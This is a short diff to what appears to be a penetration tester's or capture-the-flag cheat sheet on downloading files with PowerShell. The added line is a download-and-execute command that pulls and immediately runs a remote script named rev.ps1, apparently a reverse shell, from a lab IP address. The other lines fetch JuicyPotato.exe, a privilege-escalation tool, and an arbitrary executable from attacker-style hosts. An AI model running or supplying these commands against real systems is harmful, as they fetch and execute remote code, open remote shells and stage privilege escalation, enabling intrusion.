@@ -1,5 +1,8 @@
 # Downloading Files
 ```
+#download and execute at the same time
+powershell.exe IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')
+
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.41:8000/JuicyPotato.exe','C:/Users/kohsuke/Desktop/JuicyPotato.exe')"
 
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.14:7898/file.exe', 'file.exe')"
